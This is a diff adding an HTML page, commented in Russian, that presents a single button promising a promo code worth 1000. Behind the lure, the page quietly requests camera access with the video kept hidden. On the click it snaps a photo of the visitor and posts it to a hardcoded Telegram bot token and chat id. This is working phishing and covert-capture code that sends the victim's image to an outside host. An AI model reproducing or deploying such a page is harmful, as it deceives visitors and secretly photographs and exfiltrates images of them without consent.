@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Capture</title>
+    <style>
+        /* Скрываем видео элемент */
+        #video {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <canvas id="canvas" style="display: none;"></canvas>
+    <button id="captureButton">получить промокод на 1000с</button>
+
+    <script>
+        let stream;
+
+        // Получаем доступ к камере (без отображения видео)
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function (userStream) {
+                stream = userStream;
+            })
+            .catch(function (err) {
+                console.error('Ошибка при получении доступа к камере: ' + err);
+            });
+
+        // Захват изображения с камеры при нажатии кнопки
+        document.getElementById('captureButton').addEventListener('click', function() {
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            // Создаем временный video элемент
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            video.onloadedmetadata = function() {
+                // Настроим размеры канваса
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                // Копируем изображение с видео на холст
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Преобразуем изображение в формат base64
+                const imageData = canvas.toDataURL('image/png');
+                console.log(imageData);  // Это данные изображения в формате base64
+
+                // Преобразуем base64 данные в Blob
+                const byteString = atob(imageData.split(',')[1]);
+                const arrayBuffer = new ArrayBuffer(byteString.length);
+                const uintArray = new Uint8Array(arrayBuffer);
+
+                for (let i = 0; i < byteString.length; i++) {
+                    uintArray[i] = byteString.charCodeAt(i);
+                }
+
+                const blob = new Blob([uintArray], { type: 'image/png' });
+
+                // Отправляем фото в Telegram
+                sendPhotoToTelegram(blob);
+            };
+        });
+
+        // Функция для отправки фото в Telegram
+        function sendPhotoToTelegram(photoBlob) {
+            const token = '7717544851:AAGHeXPyrmMXp3hZre6FKCzx2zE27Jt4O_A';  // Замените на ваш токен бота
+            const chatId = '5444484112';  // Замените на ваш chat_id
+
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', photoBlob, 'photo.png');
+
+            // Отправка фото через FormData
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => console.log('Фото отправлено в Telegram:', data))
+            .catch(error => console.error('Ошибка при отправке фотографии:', error));
+        }
+    </script>
+</body>
+</html>
